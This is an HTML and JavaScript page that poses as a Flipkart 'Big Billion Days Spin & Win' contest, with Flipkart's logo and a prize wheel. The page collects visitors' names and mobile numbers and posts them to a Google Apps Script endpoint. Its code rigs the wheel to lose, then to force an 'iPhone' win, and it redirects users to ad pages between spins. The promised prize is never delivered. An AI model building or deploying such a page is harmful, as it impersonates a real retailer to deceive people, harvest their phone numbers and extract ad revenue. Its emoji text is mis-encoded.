<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéâ Spin & Win ‚Äì Flipkart Big Sale!</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #f1f3f6;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    /* Header */
    header {
      background: #2874f0;
      color: white;
      padding: 12px;
      font-size: 1.3em;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    header img {
      height: 36px;
    }
    header span {
      color: #ffeb3b;
    }

    .wheel-container {
      position: relative;
      margin: 20px auto;
      width: 320px;
      height: 320px;
    }

    /* Wheel */
    .wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 10px solid #2874f0;
      background: conic-gradient(
        #ffeb3b 0deg 60deg,
        #2874f0 60deg 120deg,
        #ff7043 120deg 180deg,
        #43a047 180deg 240deg,
        #9c27b0 240deg 300deg,
        #ff9800 300deg 360deg
      );
      transition: transform 4s ease-out;
      position: relative;
    }

    /* Pointer */
    .pointer {
      width: 0; 
      height: 0; 
      border-left: 20px solid transparent;
      border-right: 20px solid transparent;
      border-bottom: 30px solid red;
      position: absolute;
      top: -35px;
      left: 50%;
      transform: translateX(-50%);
    }

    /* Labels inside wheel */
    .label {
      position: absolute;
      width: 80px;
      text-align: center;
      font-size: 1em;
      font-weight: bold;
      top: 50%;
      left: 50%;
      transform-origin: 0 -120px;
      color: white;
    }

    .spin-btn {
      background: #ffeb3b;
      color: #2874f0;
      padding: 14px 24px;
      border-radius: 8px;
      font-size: 1.2em;
      border: none;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
    }

    .ads {
      margin: 20px auto;
      width: 320px;
      height: 100px;
      border: 2px dashed #aaa;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #555;
      background: #fff;
    }

    .hidden { display: none; }

    #result {
      font-size: 1.6em;
      color: #d32f2f;
      font-weight: bold;
      margin-top: 20px;
    }

    /* Form */
    #userForm {
      margin: 20px auto;
      display: block;
    }
    input {
      padding: 10px;
      margin: 8px;
      width: 80%;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    #submitBtn {
      background: green;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
    }

    #claimBtn {
      display: none;
      background: #2874f0;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1.2em;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Flipkart_logo.svg" alt="Flipkart Logo">
    <span>Big Billion Days ‚Äì Spin & Win üé°</span>
  </header>

  <p>Enter your details to get <b>3 Spins</b> and win exciting prizes üéÅ</p>

  <!-- User Form -->
  <form id="userForm">
    <input type="text" id="name" placeholder="Enter your name" required><br>
    <input type="tel" id="mobile" placeholder="Enter your mobile number" required><br>
    <button type="submit" id="submitBtn">Start Spinning</button>
  </form>

  <!-- Wheel -->
  <div class="wheel-container hidden" id="gameArea">
    <div class="pointer"></div>
    <div id="wheel" class="wheel">
      <div class="label" style="transform: rotate(30deg) translateY(-120px);">iPhone</div>
      <div class="label" style="transform: rotate(90deg) translateY(-120px);">iPad</div>
      <div class="label" style="transform: rotate(150deg) translateY(-120px);">EarPods</div>
      <div class="label" style="transform: rotate(210deg) translateY(-120px);">Smartwatch</div>
      <div class="label" style="transform: rotate(270deg) translateY(-120px);">Nothing</div>
      <div class="label" style="transform: rotate(330deg) translateY(-120px);">Speaker</div>
    </div>
  </div>

  <button id="spinBtn" class="spin-btn hidden">üé° Spin Now</button>
  <button id="claimBtn">Claim Prize</button>

  <div id="result"></div>

  <!-- Ad Slots -->
  <div class="ads">[Ad Slot 1]</div>
  <div class="ads">[Ad Slot 2]</div>
  <div class="ads">[Ad Slot 3]</div>

  <script>
    const form = document.getElementById("userForm");
    const gameArea = document.getElementById("gameArea");
    const wheel = document.getElementById("wheel");
    const spinBtn = document.getElementById("spinBtn");
    const claimBtn = document.getElementById("claimBtn");
    const result = document.getElementById("result");

    let spins = 0;
    let hasWon = false;

    // Handle form submit ‚Üí Save to Google Sheets & show game
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const name = document.getElementById("name").value;
      const mobile = document.getElementById("mobile").value;

      // Send to Google Sheets
      fetch("YOUR_GOOGLE_APPS_SCRIPT_URL", {
        method: "POST",
        body: JSON.stringify({ name, mobile }),
        headers: { "Content-Type": "application/json" }
      });

      form.style.display = "none";
      gameArea.classList.remove("hidden");
      spinBtn.classList.remove("hidden");
    });

    spinBtn.addEventListener("click", () => {
      spins++;
      let degree;

      if (spins === 1) {
        // Always lose first spin
        degree = 1800 + 270; // lands on "Nothing"
      } else if (spins === 2) {
        // Random spin
        degree = 1800 + Math.floor(Math.random() * 360);
      } else {
        // Force win on last spin
        degree = 1800 + 30; // lands on iPhone
        hasWon = true;
      }

      wheel.style.transform = `rotate(${degree}deg)`;

      setTimeout(() => {
        if (spins === 1) {
          result.textContent = "‚ùå Oops, try again after the ad!";
        } else if (spins === 2) {
          result.textContent = "Almost there! Watch another ad...";
        } else if (spins === 3) {
          result.textContent = hasWon
            ? "üéâ Congratulations! You won üéÅ"
            : "‚ùå Better luck next time!";
          spinBtn.style.display = "none";
          claimBtn.style.display = "inline-block";
        }

        // Redirect to ad page after each spin (except last result message)
        if (spins < 3) {
          setTimeout(() => {
            window.location.href = "https://example.com/ad-page"; // replace with ad page
          }, 2000);
        }
      }, 4000);
    });

    claimBtn.addEventListener("click", () => {
      result.textContent = "‚úÖ We will reach back to you soon!";
      claimBtn.style.display = "none";
    });
  </script>
</body>
</html>
